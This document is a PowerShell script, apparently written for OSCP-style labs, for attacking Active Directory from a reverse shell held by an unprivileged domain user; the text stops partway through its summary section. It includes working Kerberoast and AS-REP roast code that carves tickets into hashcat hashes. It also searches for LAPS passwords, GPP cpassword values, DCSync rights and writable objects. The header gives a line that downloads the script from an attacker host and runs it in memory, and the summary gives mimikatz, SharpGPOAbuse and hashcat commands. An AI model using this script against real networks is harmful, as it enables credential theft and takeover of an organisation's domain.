<#
  ade.ps1 - Active Directory enumeration from a domain-joined Windows host.

  USE CASE: you have a reverse shell as an UNPRIVILEGED domain user and you do
  NOT know the password. That is fine - the shell already runs under that
  user's token, so every LDAP query below authenticates as them (integrated
  Windows auth). No credentials are ever typed.

  Read-only. Pure ADSI / .NET: no PowerView, no SharpHound, nothing downloaded,
  so a module load never trips AMSI. It writes one file per check to an output
  folder, prints a per-check verdict, and ends with a ranked SUMMARY that says
  what to do next - most of it back on Kali once you have hashes to crack.

    powershell -ep bypass -f ade.ps1
    powershell -ep bypass -f ade.ps1 -OutDir C:\Users\Public\ade
    # in-memory, no file on disk:  IEX(New-Object Net.WebClient).DownloadString('http://KALI/ade.ps1')

  Findings are built from the returned objects, not by grepping the output
  files, so the command text can never be mistaken for a result.
#>
[CmdletBinding()]
param(
    [string]$OutDir,
    [string]$Domain,                 # override the naming context, e.g. corp.com
    [switch]$SkipAcl,                # the ACL scan is the slowest part
    [switch]$Roast,                  # actively request TGS/AS-REP and dump crackable hashes
    [switch]$Quiet                   # summary only, no per-check lines
)

$ErrorActionPreference = 'Stop'
$script:Data     = @{}               # slug -> objects, consumed by the summary
$script:Findings = @()               # ordered list of {Sev,Title,Body,Next}
$script:N_OK=0; $script:N_EMPTY=0; $script:N_FAIL=0

# ---------------------------------------------------------------- output ---
function Say([string]$s,[string]$c='Gray'){ if(-not $Quiet){ Write-Host $s -ForegroundColor $c } }
function Section([string]$s){ Say "`n[=== $s ===]" 'Cyan' }

# well-known GUIDs that turn an ExtendedRight ACE into something dangerous
$G_ReplGet    = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'   # DS-Replication-Get-Changes
$G_ReplGetAll = '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'   # ...-Get-Changes-All  (DCSync = both)
$G_ForcePwd   = '00299570-246d-11d0-a768-00aa006e0529'   # User-Force-Change-Password
$G_WriteMember= 'bf9679c0-0de6-11d0-a285-00aa003049e2'   # add self/others to a group

# ----------------------------------------------------------- domain bind ---
try {
    $rootDSE = [ADSI]'LDAP://RootDSE'
    $script:DefaultNC = [string]$rootDSE.Properties['defaultNamingContext'].Value
    $script:DcName    = [string]$rootDSE.Properties['dnsHostName'].Value
    $script:ConfigNC  = [string]$rootDSE.Properties['configurationNamingContext'].Value   # ADCS lives here
    if (-not $DefaultNC) { throw 'RootDSE returned no defaultNamingContext' }
} catch {
    Write-Host "[-] Cannot reach a Domain Controller over LDAP: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "    Are you on a domain-joined host? Try: nltest /dsgetdc:$env:USERDNSDOMAIN" -ForegroundColor Yellow
    exit 1
}
if ($Domain) { $script:DefaultNC = 'DC=' + ($Domain -replace '\.',',DC=') }

# who am I: my SID plus every group SID - the ACL scan matches ACEs against these
$me      = [Security.Principal.WindowsIdentity]::GetCurrent()
$script:MySids = @($me.User.Value) + @($me.Groups | ForEach-Object { $_.Value }) | Sort-Object -Unique
$script:MeName = $me.Name

if (-not $OutDir) { $OutDir = Join-Path $env:TEMP ("ade-{0:yyyyMMdd-HHmmss}" -f (Get-Date)) }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Section 'PRE-FLIGHT'
Say ("[*] Running as : {0}" -f $MeName) 'Cyan'
Say ("[*] Domain     : {0}" -f $DefaultNC) 'Cyan'
Say ("[*] DC         : {0}" -f $DcName) 'Cyan'
Say ("[*] Output      : {0}" -f $OutDir) 'Cyan'
Say  "[!] No credentials needed: every query uses the current user's token." 'Yellow'

# ---------------------------------------------------------------- search ---
function Search-AD {
    param([string]$Filter,[string[]]$Props,[string]$Base,[switch]$WithAcl)
    $path = if ($Base) { "LDAP://$Base" } else { "LDAP://$DefaultNC" }
    $de = New-Object System.DirectoryServices.DirectoryEntry($path)
    $s  = New-Object System.DirectoryServices.DirectorySearcher($de)
    $s.Filter   = $Filter
    $s.PageSize = 1000
    foreach ($p in $Props) { [void]$s.PropertiesToLoad.Add($p) }
    if ($WithAcl) {
        $s.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        [void]$s.PropertiesToLoad.Add('ntsecuritydescriptor')
        [void]$s.PropertiesToLoad.Add('distinguishedname')
    }
    try { $s.FindAll() } finally { }
}

# flatten an ADSI result row into a tidy object (property keys come back lowercased)
function Convert-Row {
    param($r,[string[]]$Props)
    $o = [ordered]@{}
    foreach ($p in $Props) {
        $v = $r.Properties[$p.ToLower()]
        $o[$p] = if ($v -and $v.Count) { ($v | ForEach-Object { "$_" }) -join ' ; ' } else { '' }
    }
    [pscustomobject]$o
}

# UAC bits worth naming on sight
function Decode-UAC([int]$uac){
    $f=@(); if($uac -band 0x2){$f+='DISABLED'}; if($uac -band 0x10){$f+='LOCKOUT'}
    if($uac -band 0x20){$f+='PASSWD_NOTREQD'}; if($uac -band 0x10000){$f+='DONT_EXPIRE'}
    if($uac -band 0x80000){$f+='TRUSTED_FOR_DELEGATION'}; if($uac -band 0x400000){$f+='DONT_REQ_PREAUTH'}
    if($uac -band 0x1000000){$f+='TRUSTED_TO_AUTH_FOR_DELEGATION'}; $f -join ','
}

# ------------------------------------------------- pure-PowerShell roasting ---
# Kerberoast and AS-REP roast without Rubeus/mimikatz. Kerberoast asks the KDC
# for a service ticket (KerberosRequestorSecurityToken) - authenticated by the
# current token, no password - and carves the encrypted part out of the AP-REQ.
# AS-REP roast sends a raw pre-auth-less AS-REQ to the DC and reads the reply.
# Both reformat the cipher to a hashcat string. RFC 4120 tag layout, so no DC
# is needed to know where the bytes are.  NOTE: requesting a ticket is logged
# (event 4769, RC4) - this only runs with -Roast.

# minimal DER TLV reader. Kerberos tags are all single-byte here.
function Get-Tlv([byte[]]$b,[int]$off){
    $tag=$b[$off]; $len=$b[$off+1]; $i=$off+2
    if($len -ge 0x80){ $n=$len-0x80; $len=0; for($k=0;$k -lt $n;$k++){ $len=($len -shl 8) -bor $b[$i]; $i++ } }
    [pscustomobject]@{ Tag=$tag; Start=$i; Length=$len; End=$i+$len }
}
function Find-Child([byte[]]$b,[int]$cStart,[int]$cEnd,[int]$tag){
    $i=$cStart
    while($i -lt $cEnd){ $t=Get-Tlv $b $i; if($t.Tag -eq $tag){ return $t }; $i=$t.End }
    $null
}
# from an EncryptedData SEQUENCE (at seqStart..seqEnd) pull etype + cipher bytes
function Get-EncPart([byte[]]$b,[int]$seqStart,[int]$seqEnd){
    $etCtx=Find-Child $b $seqStart $seqEnd 0xA0; $etInt=Get-Tlv $b $etCtx.Start
    $et=0; for($i=$etInt.Start;$i -lt $etInt.End;$i++){ $et=($et -shl 8) -bor $b[$i] }
    $cCtx=Find-Child $b $seqStart $seqEnd 0xA2; $oct=Get-Tlv $b $cCtx.Start
    [pscustomobject]@{ Et=$et; Cipher=$b[$oct.Start..($oct.End-1)] }
}
function ConvertTo-HexStr([byte[]]$b){ ($b | ForEach-Object { $_.ToString('x2') }) -join '' }

# hashcat line for a carved cipher. RC4 (etype 23) puts the 16-byte checksum
# first; AES (17/18) appends the 12-byte tag last. RC4 is the common roast.
function Format-KrbHash([string]$Kind,[int]$Et,[string]$User,[string]$Realm,[string]$Spn,[byte[]]$Cipher){
    $hex = ConvertTo-HexStr $Cipher
    if($Et -eq 23){
        $chk=$hex.Substring(0,32); $ed=$hex.Substring(32)
        if($Kind -eq 'tgs'){ "`$krb5tgs`$23`$*${User}`$${Realm}`$${Spn}*`$${chk}`$${ed}" }
        else               { "`$krb5asrep`$23`$${User}@${Realm}:${chk}`$${ed}" }
    } elseif($Et -eq 17 -or $Et -eq 18){
        $chk=$hex.Substring($hex.Length-24); $ed=$hex.Substring(0,$hex.Length-24)
        if($Kind -eq 'tgs'){ "`$krb5tgs`$${Et}`$${User}`$${Realm}`$*${Spn}*`$${ed}`$${chk}" }
        else               { "`$krb5asrep`$${Et}`$${User}@${Realm}:${ed}`$${chk}" }
    } else { $null }
}

# Kerberoast one SPN using the current token. Returns a hashcat string or throws.
function Get-KerberoastHash([string]$Spn,[string]$User,[string]$Realm){
    Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue
    $tok = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $Spn
    $b   = $tok.GetRequest()                                   # AP-REQ
    $apreq=Get-Tlv $b 0                                        # [APPLICATION 14]
    $seq  =Get-Tlv $b $apreq.Start                             # SEQUENCE
    $tk   =Find-Child $b $seq.Start $seq.End 0xA3              # [3] ticket
    $tkApp=Get-Tlv $b $tk.Start                                # [APPLICATION 1]
    $tSeq =Get-Tlv $b $tkApp.Start                             # SEQUENCE
    $enc  =Find-Child $b $tSeq.Start $tSeq.End 0xA3            # [3] enc-part
    $eSeq =Get-Tlv $b $enc.Start                               # EncryptedData SEQ
    $ep = Get-EncPart $b $eSeq.Start $eSeq.End
    Format-KrbHash 'tgs' $ep.Et $User $Realm $Spn $ep.Cipher
}

# DER length prefix (definite form) for a content length
function Get-DerLen([int]$n){
    if($n -lt 0x80){ return ,([byte]$n) }
    $by=@(); $x=$n; while($x -gt 0){ $by=,([byte]($x -band 0xFF))+$by; $x=$x -shr 8 }
    ,([byte](0x80 -bor $by.Count)) + $by
}
function New-Der([int]$tag,[byte[]]$val){ ,([byte]$tag) + (Get-DerLen $val.Count) + $val }
function New-DerInt([int]$v){ $by=@(); $x=$v; if($x -eq 0){$by=,([byte]0)}; while($x -gt 0){ $by=,([byte]($x -band 0xFF))+$by; $x=$x -shr 8 }; if($by[0] -ge 0x80){ $by=,([byte]0)+$by }; New-Der 0x02 $by }
function New-DerStr([int]$tag,[string]$str){ New-Der $tag ([Text.Encoding]::ASCII.GetBytes($str)) }

# AS-REP roast one user with a raw, pre-auth-less AS-REQ to the DC over TCP/88.
function Get-AsrepHash([string]$User,[string]$Realm,[string]$DcHost){
    $up=$Realm.ToUpper()
    # cname [1] PrincipalName { name-type[0]=1 (NT_PRINCIPAL), name-string[1] SEQ OF }
    $cname = New-Der 0xA1 ((New-Der 0xA0 (New-DerInt 1)) + (New-Der 0xA1 (New-Der 0x30 (New-DerStr 0x1B $User))))
    $realmF= New-Der 0xA2 (New-DerStr 0x1B $up)
    # sname [3] = krbtgt/REALM (name-type 2, NT_SRV_INST)
    $sname = New-Der 0xA3 ((New-Der 0xA0 (New-DerInt 2)) + (New-Der 0xA1 (New-Der 0x30 ((New-DerStr 0x1B 'krbtgt') + (New-DerStr 0x1B $up)))))
    $till  = New-Der 0xA5 (New-DerStr 0x18 '20370913024805Z')
    $nonce = New-Der 0xA7 (New-DerInt 1818848256)
    $etypes= New-Der 0xA8 (New-Der 0x30 ((New-DerInt 23)+(New-DerInt 18)+(New-DerInt 17)))
    $kdcopt= New-Der 0xA0 (New-Der 0x03 ([byte[]](0x00,0x50,0x00,0x00,0x00)))   # forwardable,renewable
    $body  = New-Der 0x30 ($kdcopt+$cname+$realmF+$sname+$till+$nonce+$etypes)
    $req   = New-Der 0x6A (New-Der 0x30 ((New-Der 0xA1 (New-DerInt 5)) + (New-Der 0xA2 (New-DerInt 10)) + (New-Der 0xA4 $body)))
    $frame = [byte[]](0,0,0,0); [Array]::Copy([BitConverter]::GetBytes([Net.IPAddress]::HostToNetworkOrder([int]$req.Count)),0,$frame,0,4)
    $cli=New-Object Net.Sockets.TcpClient; $cli.Connect($DcHost,88)
    $ns=$cli.GetStream(); $ns.Write($frame,0,4); $ns.Write($req,0,$req.Count); $ns.Flush()
    $lenB=New-Object byte[] 4; [void]$ns.Read($lenB,0,4)
    $rlen=[Net.IPAddress]::NetworkToHostOrder([BitConverter]::ToInt32($lenB,0))
    $resp=New-Object byte[] $rlen; $read=0; while($read -lt $rlen){ $read+=$ns.Read($resp,$read,$rlen-$read) }
    $cli.Close()
    if($resp[0] -eq 0x7E){ throw "KRB-ERROR (pre-auth required? account not AS-REP roastable)" }  # [APPLICATION 30]
    $rep=Get-Tlv $resp 0                                       # [APPLICATION 11] AS-REP
    $seq=Get-Tlv $resp $rep.Start
    $enc=Find-Child $resp $seq.Start $seq.End 0xA6             # [6] enc-part (user's key)
    $eSeq=Get-Tlv $resp $enc.Start
    $ep = Get-EncPart $resp $eSeq.Start $eSeq.End
    Format-KrbHash 'asrep' $ep.Et $User $up '' $ep.Cipher
}

# run one check: store objects, write a file, print a verdict, tally
function Run {
    param([string]$Slug,[string]$Desc,[scriptblock]$Action)
    $file = Join-Path $OutDir "$Slug.txt"
    $objs = $null; $errMsg = $null
    try { $objs = & $Action } catch { $errMsg = $_.Exception.Message }

    "# $Desc" | Set-Content -Encoding UTF8 $file
    if ($errMsg) {
        Add-Content $file "[error] $errMsg"
        $script:Data[$Slug] = @()
        $script:N_FAIL++
        Say ("  [FAIL] {0,-46} {1}" -f $Desc,$errMsg) 'Red'
        return
    }
    # @($null).Count is 1, so drop nulls or an empty check reads as one object
    $arr = @($objs | Where-Object { $null -ne $_ })
    $script:Data[$Slug] = $arr
    if ($arr.Count) {
        $names = @($arr[0].psobject.Properties.Name)
        if ($names.Count -eq 1 -and $names[0] -eq 'Line') {
            Add-Content $file ($arr.Line -join "`n")            # raw LOLBin output, no "Line :" noise
        } else {
            Add-Content $file (($arr | Format-List | Out-String).Trim())
        }
    }

    if ($arr.Count -eq 0) {
        $script:N_EMPTY++; Say ("  [----] {0,-46} no results" -f $Desc) 'DarkYellow'
    } else {
        $script:N_OK++;   Say ("  [ OK ] {0,-46} {1} object(s)" -f $Desc,$arr.Count) 'Green'
    }
}

function Add-Finding([string]$Sev,[string]$Title,$Body,[string]$Next){
    $script:Findings += [pscustomobject]@{ Sev=$Sev; Title=$Title; Body=$Body; Next=$Next }
}

# =========================================================== ENUMERATION ===
Section 'CURRENT CONTEXT'
Run '00-whoami'      'my token: groups, privileges, SID' { (whoami /all) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } } }
Run '00-localadmins' 'local Administrators of THIS host' { (net localgroup Administrators) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } } }
Run '00-sessions'    'sessions on THIS host'             { (qwinsta) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } } }
# read the lockout threshold BEFORE anyone sprays: one password per round only.
Run '00-passpol'     'domain password / lockout policy'  { (net accounts /domain) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } } }

Section 'DOMAIN'
Run '01-dcs'    'domain controllers'      { (nltest /dclist:$env:USERDNSDOMAIN) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } } }
Run '02-trusts' 'domain trusts'           {
    (nltest /domain_trusts) 2>&1 | ForEach-Object { [pscustomobject]@{ Line=$_ } }
    Search-AD '(objectClass=trustedDomain)' @('name','trustDirection','trustAttributes','flatName') |
        ForEach-Object { Convert-Row $_ @('name','trustDirection','trustAttributes','flatName') }
}

Section 'USERS & GROUPS'
$uProps = @('sAMAccountName','description','userAccountControl','memberOf','adminCount','servicePrincipalName','lastLogonTimestamp','pwdLastSet')
Run '03-users' 'all domain users (+ description, UAC)' {
    Search-AD '(&(objectCategory=person)(objectClass=user))' $uProps | ForEach-Object {
        $row = Convert-Row $_ $uProps
        $uac = 0; [void][int]::TryParse($row.userAccountControl,[ref]$uac)
        $row | Add-Member -NotePropertyName 'UACflags' -NotePropertyValue (Decode-UAC $uac) -PassThru
    }
}
Run '04-groups' 'groups and their members' {
    Search-AD '(objectCategory=group)' @('sAMAccountName','description','member') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','description','member') }
}
Run '05-priv-groups' 'members of privileged groups' {
    $names = 'Domain Admins','Enterprise Admins','Administrators','Schema Admins','Account Operators','Backup Operators','Server Operators','DnsAdmins','Group Policy Creator Owners'
    foreach ($g in $names) {
        $res = Search-AD "(&(objectCategory=group)(cn=$g))" @('member','cn')
        foreach ($r in $res) {
            $m = $r.Properties['member']
            if ($m -and $m.Count) { $m | ForEach-Object { [pscustomobject]@{ Group=$g; Member=$_ } } }
        }
    }
}

Section 'COMPUTERS'
Run '06-computers' 'computers and their OS' {
    Search-AD '(objectCategory=computer)' @('name','dNSHostName','operatingSystem','operatingSystemVersion') |
        ForEach-Object { Convert-Row $_ @('name','dNSHostName','operatingSystem','operatingSystemVersion') }
}

Section 'KERBEROS ATTACK SURFACE'
Run '07-spn' 'SPN set = kerberoastable (needs only a token)' {
    Search-AD '(&(objectClass=user)(servicePrincipalName=*))' @('sAMAccountName','servicePrincipalName','memberOf') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','servicePrincipalName','memberOf') }
}
Run '08-asrep' 'no Kerberos pre-auth = AS-REP roastable' {
    Search-AD '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' @('sAMAccountName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName') }
}

# active roasting with the current token - only when asked (-Roast), because
# requesting these tickets is logged on the DC.
if ($Roast) {
    $realm = ($DefaultNC -replace 'DC=','' -replace ',','.')
    Run '07b-kerberoast' 'TGS tickets requested + carved to hashcat (pure PS)' {
        foreach ($u in $Data['07-spn']) {
            $spn = ($u.servicePrincipalName -split ' ; ')[0]
            if (-not $spn) { continue }
            try   { [pscustomobject]@{ User=$u.sAMAccountName; Hash=(Get-KerberoastHash $spn $u.sAMAccountName $realm) } }
            catch { [pscustomobject]@{ User=$u.sAMAccountName; Hash="[failed] $($_.Exception.Message)" } }
        }
    }
    Run '08b-asreproast' 'AS-REP hashes via raw AS-REQ (pure PS)' {
        foreach ($u in $Data['08-asrep']) {
            try   { [pscustomobject]@{ User=$u.sAMAccountName; Hash=(Get-AsrepHash $u.sAMAccountName $realm $DcName) } }
            catch { [pscustomobject]@{ User=$u.sAMAccountName; Hash="[failed] $($_.Exception.Message)" } }
        }
    }
}

Section 'DELEGATION'
Run '09-unconstrained' 'unconstrained delegation' {
    Search-AD '(userAccountControl:1.2.840.113556.1.4.803:=524288)' @('sAMAccountName','dNSHostName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','dNSHostName') }
}
Run '10-constrained' 'constrained delegation (msDS-AllowedToDelegateTo)' {
    Search-AD '(msDS-AllowedToDelegateTo=*)' @('sAMAccountName','msDS-AllowedToDelegateTo') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','msDS-AllowedToDelegateTo') }
}
# resource-based constrained delegation: an object carrying
# msDS-AllowedToActOnBehalfOfOtherIdentity trusts another principal to act for
# it (S4U2Proxy). Whoever controls that trusted principal can impersonate any
# user to that object - the same surface ad-enum.sh flags from Kali.
Run '10b-rbcd' 'resource-based constrained delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)' {
    Search-AD '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' @('sAMAccountName','dNSHostName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','dNSHostName') }
}

Section 'WEAK ACCOUNTS'
Run '11-admincount'  'protected accounts (adminCount=1)' {
    Search-AD '(&(objectCategory=person)(adminCount=1))' @('sAMAccountName','memberOf') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','memberOf') }
}
Run '12-passnotreq'  'PASSWD_NOTREQD' {
    Search-AD '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))' @('sAMAccountName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName') }
}
Run '12b-neverexpires' 'password never expires (DONT_EXPIRE)' {
    Search-AD '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' @('sAMAccountName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName') }
}
# credentials parked straight into an attribute. userPassword/unixUserPassword
# are often readable and base64; ms-Mcs-AdmPwd / msLAPS-* are LAPS (see 13-laps).
Run '12c-pw-attrs' 'cleartext-ish password attributes (userPassword, unixUserPassword, ...)' {
    Search-AD '(|(userPassword=*)(unixUserPassword=*)(unicodePwd=*))' @('sAMAccountName','name','userPassword','unixUserPassword') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','name','userPassword','unixUserPassword') }
}

Section 'SECRETS AT REST'
Run '13-laps' 'LAPS local-admin passwords readable by me' {
    Search-AD '(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))' @('name','ms-Mcs-AdmPwd','msLAPS-Password') |
        ForEach-Object { Convert-Row $_ @('name','ms-Mcs-AdmPwd','msLAPS-Password') }
}
Run '14-gpo' 'GPOs' {
    Search-AD '(objectCategory=groupPolicyContainer)' @('displayName','gPCFileSysPath') |
        ForEach-Object { Convert-Row $_ @('displayName','gPCFileSysPath') }
}
# gMSA: the managed password (msDS-ManagedPassword) is only handed to the
# principals in msDS-GroupMSAMembership - but the *presence* of a gMSA is always
# visible, and if the current token is a reader you own that account's hash.
Run '16-gmsa' 'group managed service accounts (gMSA present?)' {
    Search-AD '(objectClass=msDS-GroupManagedServiceAccount)' @('sAMAccountName','msDS-GroupMSAMembership','servicePrincipalName') |
        ForEach-Object { Convert-Row $_ @('sAMAccountName','msDS-GroupMSAMembership','servicePrincipalName') }
}
# ms-DS-MachineAccountQuota > 0 means any domain user can add a computer object -
# the prerequisite for RBCD and for a fake computer in shadow-credential chains.
Run '16b-maq' 'ms-DS-MachineAccountQuota (can any user add a computer?)' {
    Search-AD '(objectClass=domain)' @('ms-DS-MachineAccountQuota') |
        ForEach-Object { Convert-Row $_ @('ms-DS-MachineAccountQuota') }
}
# AD CS enrollment services live in the Configuration NC. Pure ADSI can confirm
# a CA exists (and name it); the ESC1-8 vulnerability analysis still needs
# certipy from Kali (see ad-enum.sh 23-adcs-certipy).
Run '16c-adcs' 'AD CS enrollment services present (Configuration NC)' {
    if (-not $ConfigNC) { return }
    Search-AD '(objectClass=pKIEnrollmentService)' @('name','dNSHostName','cACertificateDN') -Base $ConfigNC |
        ForEach-Object { Convert-Row $_ @('name','dNSHostName','cACertificateDN') }
}

Section 'SYSVOL'
# Group Policy Preferences left a cpassword in an XML on SYSVOL (readable by every
# domain user). The AES key is public, so it decrypts to a usable local-admin
# password. Pull it from the host over the SYSVOL share; decrypt back on Kali
# (gpp-decrypt) - the same win ad-enum.sh gets with 20-gpp / 26-sysvol-gpp.
Run '17-sysvol-gpp' 'cpassword in SYSVOL Group Policy Preferences' {
    $dom = $env:USERDNSDOMAIN
    if (-not $dom) { return }
    $base = "\\$dom\SYSVOL\$dom\Policies"
    $files = Get-ChildItem -Path $base -Recurse -Include *.xml -ErrorAction SilentlyContinue
    foreach ($f in $files) {
        $hit = Select-String -Path $f.FullName -Pattern 'cpassword' -SimpleMatch -ErrorAction SilentlyContinue
        if ($hit) {
            $blob = ([regex]'cpassword="([^"]*)"').Match($hit.Line).Groups[1].Value
            [pscustomobject]@{ File=$f.FullName; cpassword=$blob }
        }
    }
}

# --------------------------------------------------------------- ACL scan ---
# The question this answers: which objects can THIS token write, and do I hold
# replication (DCSync) rights? One paged search per category reads every DACL;
# each ACE is matched against my SID set, so no per-object bind is needed.
if (-not $SkipAcl) {
    Section 'ACL - WHAT CAN THIS ACCOUNT ABUSE'
    Run '15-acl' 'dangerous ACEs held by me (incl. DCSync)' {
        $dangerRights = 'GenericAll','GenericWrite','WriteDacl','WriteOwner','WriteProperty','Self','ExtendedRight'
        $aclFilter = "(|(objectCategory=person)(objectCategory=group)(objectCategory=computer)(distinguishedName=$DefaultNC))"
        $targets = Search-AD $aclFilter @('samaccountname','name') -WithAcl
        foreach ($r in $targets) {
            $dn = [string]$r.Properties['distinguishedname'][0]
            $sdBytes = $r.Properties['ntsecuritydescriptor']
            if (-not $sdBytes -or -not $sdBytes.Count) { continue }
            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
            $sd.SetSecurityDescriptorBinaryForm($sdBytes[0])
            foreach ($ace in $sd.GetAccessRules($true,$true,[Security.Principal.SecurityIdentifier])) {
                if ($MySids -notcontains $ace.IdentityReference.Value) { continue }
                $rights = $ace.ActiveDirectoryRights.ToString()
                if (-not ($dangerRights | Where-Object { $rights -match $_ })) { continue }
                $ot = $ace.ObjectType.ToString()
                $isDcSync = ($ot -eq $G_ReplGet -or $ot -eq $G_ReplGetAll -or ($rights -match 'GenericAll' -and $dn -eq $DefaultNC))
                $kind = if ($isDcSync) { 'DCSYNC' }
                        elseif ($ot -eq $G_ForcePwd) { 'ForceChangePassword' }
                        elseif ($ot -eq $G_WriteMember) { 'AddMember' }
                        else { $rights }
                [pscustomobject]@{ Target=$dn; Right=$kind; ObjectTypeGuid=$ot; TrusteeSid=$ace.IdentityReference.Value }
            }
        }
    }

    # GPO abuse: which GROUP POLICY OBJECTS can this token edit? A write-class
    # ACE on a groupPolicyContainer (the PowerView "GpoEditDeleteModifySecurity"
    # right) means SharpGPOAbuse can drop a scheduled task / local-admin add into
    # every host the GPO is linked to. The 15-acl scan above intentionally skips
    # groupPolicyContainer objects, so this is the check that would have flagged
    # charlotte's edit right on the Default Domain Policy (Secura DC).
    Run '15b-gpo-editable' 'GPOs THIS token can edit (GPO abuse -> SharpGPOAbuse)' {
        $gpoRights = 'GenericAll','GenericWrite','WriteProperty','WriteDacl','WriteOwner'
        Search-AD '(objectCategory=groupPolicyContainer)' @('displayName','distinguishedName') -WithAcl | ForEach-Object {
            $dn      = [string]$_.Properties['distinguishedname'][0]
            $name    = if ($_.Properties['displayname'] -and $_.Properties['displayname'].Count) { [string]$_.Properties['displayname'][0] } else { $dn }
            $sdBytes = $_.Properties['ntsecuritydescriptor']
            if (-not $sdBytes -or -not $sdBytes.Count) { return }
            $sd = New-Object System.DirectoryServices.ActiveDirectorySecurity
            $sd.SetSecurityDescriptorBinaryForm($sdBytes[0])
            foreach ($ace in $sd.GetAccessRules($true,$true,[Security.Principal.SecurityIdentifier])) {
                if ($MySids -notcontains $ace.IdentityReference.Value) { continue }
                $rights = $ace.ActiveDirectoryRights.ToString()
                if (-not ($gpoRights | Where-Object { $rights -match $_ })) { continue }
                [pscustomobject]@{ GPO=$name; Right=$rights; DN=$dn; TrusteeSid=$ace.IdentityReference.Value }
            }
        }
    }
}

# =============================================================== SUMMARY ===
# Everything here reads $script:Data objects - never the output files - so a
# banner or the command line can never be mistaken for a result.
Section 'SUMMARY - QUICK WINS'

# passwords parked in description fields (the classic OSCP AD win)
$descHits = $Data['03-users'] | Where-Object {
    $_.description -and $_.description -match '(?i)pass|pwd|cred|secret|welcome|summer|winter'
} | Select-Object sAMAccountName,description
if ($descHits) { Add-Finding 'HIGH' 'Passwords possibly in user descriptions' $descHits `
    "test each one: crackmapexec/nxc smb $DcName -u <user> -p '<pass>' -d <domain>" }

$spn = $Data['07-spn'] | Select-Object sAMAccountName,servicePrincipalName
if ($spn) { Add-Finding 'HIGH' 'Kerberoastable accounts (SPN set)' $spn `
    "grab them now, no creds: re-run with -Roast (pure PS), or Rubeus.exe kerberoast  -> hashcat -m 13100" }

$asrep = $Data['08-asrep'] | Select-Object sAMAccountName
if ($asrep) { Add-Finding 'HIGH' 'AS-REP roastable accounts (no pre-auth)' $asrep `
    "re-run with -Roast to fetch them (pure PS raw AS-REQ), or Rubeus.exe asreproast  -> hashcat -m 18200" }

$tgsHashes = $Data['07b-kerberoast'] | Where-Object { $_.Hash -like '$krb5tgs$*' }
if ($tgsHashes) {
    ($tgsHashes | ForEach-Object { $_.Hash }) | Set-Content -Encoding ascii (Join-Path $OutDir 'tgs.hashes')
    Add-Finding 'HIGH' 'Kerberoast hashes captured (pure PS)' ($tgsHashes | Select-Object User) `
        "crack on Kali: hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt --force" }

$asrepHashes = $Data['08b-asreproast'] | Where-Object { $_.Hash -like '$krb5asrep$*' }
if ($asrepHashes) {
    ($asrepHashes | ForEach-Object { $_.Hash }) | Set-Content -Encoding ascii (Join-Path $OutDir 'asrep.hashes')
    Add-Finding 'HIGH' 'AS-REP hashes captured (pure PS)' ($asrepHashes | Select-Object User) `
        "crack on Kali: hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force" }

$laps = $Data['13-laps'] | Where-Object { $_.'ms-Mcs-AdmPwd' -or $_.'msLAPS-Password' }
if ($laps) { Add-Finding 'CRIT' 'LAPS passwords readable by this account' $laps `
    "that is the local Administrator password of that host: use it with --local-auth / runas / PSRemoting" }

# ACL hits: DCSync is domain-game-over, the rest are object-control paths
$acl = $Data['15-acl']
$dcsync = $acl | Where-Object { $_.Right -eq 'DCSYNC' }
if ($dcsync) { Add-Finding 'CRIT' 'DCSync rights held by this account' $dcsync `
    "domain compromise without a shell on the DC: mimikatz lsadump::dcsync /user:krbtgt  (or secretsdump from Kali once you have creds)" }
$writeHits = $acl | Where-Object { $_.Right -ne 'DCSYNC' }
if ($writeHits) {
    $hv = $writeHits | Where-Object { $_.Target -match '(?i)Domain Admins|Enterprise Admins|OU=Domain Controllers|Administrators|krbtgt|Key Admins' }
    if ($hv)  { Add-Finding 'CRIT' 'You control a HIGH VALUE object (ACL abuse)' $hv `
        "PowerView: on a group Add-DomainGroupMember; on a user Set-DomainUserPassword or add an SPN then kerberoast" }
    $other = $writeHits | Where-Object { $_ -notin $hv }
    if ($other) { Add-Finding 'HIGH' 'Objects this account can write (ACL abuse)' $other `
        "read as Target/Right; if you can reach a privileged principal through it, chain toward Domain Admins" }
}

# GPO edit rights = SharpGPOAbuse against every host the policy is linked to
$gpoEdit = $Data['15b-gpo-editable']
if ($gpoEdit) {
    $gpoHv = $gpoEdit | Where-Object { $_.GPO -match '(?i)Default Domain Policy|Default Domain Controllers' }
    if ($gpoHv) { Add-Finding 'CRIT' 'You can edit a domain-wide GPO (GPO abuse)' $gpoHv `
        "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName '<GPO>'  then gpupdate/wait -> local admin on the linked hosts (incl. the DC for Default Domain Policy)" }
    $gpoOther = $gpoEdit | Where-Object { $_ -notin $gpoHv }
